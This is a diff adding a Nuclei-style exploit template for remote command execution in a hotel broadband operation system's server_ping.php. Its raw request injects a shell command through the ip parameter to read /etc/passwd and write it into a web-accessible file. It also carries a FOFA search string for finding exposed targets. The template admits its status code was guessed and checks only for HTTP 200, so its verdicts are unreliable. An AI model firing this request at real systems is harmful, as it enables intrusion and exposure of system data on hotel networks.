@@ -1,0 +1,41 @@
+id: poc-ac1f5f1c331523a495b0
+info:
+  name: 酒店宽带运营系统server_ping远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ac1f5f1c331523a495b010f4f6958e6b
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ac1f5f1c331523a495b010f4f6958e6b
+    fofa: + fofa`"酒店宽带运营"`
+http:
+- raw:
+  - 'GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../stc.txt&id=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Pragma: no-cache
+
+    Cache-Control: no-cache
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Referer:
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+
+    Cookie: PHPSESSID=noei1ghcv9rqgp58jf79991n04'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
